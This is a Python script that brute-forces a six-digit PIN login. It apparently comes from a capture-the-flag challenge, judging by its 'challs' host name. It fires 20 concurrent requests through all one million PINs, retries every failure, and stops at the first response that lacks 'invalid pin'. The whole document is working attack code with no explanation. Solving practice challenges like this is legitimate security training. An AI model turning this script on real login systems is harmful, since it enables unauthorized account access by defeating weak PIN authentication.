import asyncio
import aiohttp

URL = "https://dumb-factor-authentication-618f7c21ea46ca97-global.challs.brunnerne.xyz/login"
LIMIT = 20

async def try_pin(session, pin):
    pin_str = f"{pin:06d}"
    while True:
        try:
            # force_close to avoid keep-alive disconnects
            async with session.post(URL, data={"pin": pin_str}) as response:
                return pin_str, await response.text()
        except Exception:
            await asyncio.sleep(0.5)

async def brute_force():
    headers = {"Connection": "close"}
    async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(limit_per_host=LIMIT, force_close=True)) as session:
        tasks = set()
        next_pin = 0
        
        while next_pin < 1_000_000 or tasks:
            while len(tasks) < LIMIT and next_pin < 1_000_000:
                tasks.add(asyncio.create_task(try_pin(session, next_pin)))
                next_pin += 1
                
            done, tasks = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            
            for task in done:
                pin, text = task.result()
                if "invalid pin" not in text.lower():
                    print(pin)
                    for t in tasks: t.cancel()
                    return

if __name__ == "__main__":
    asyncio.run(brute_force())
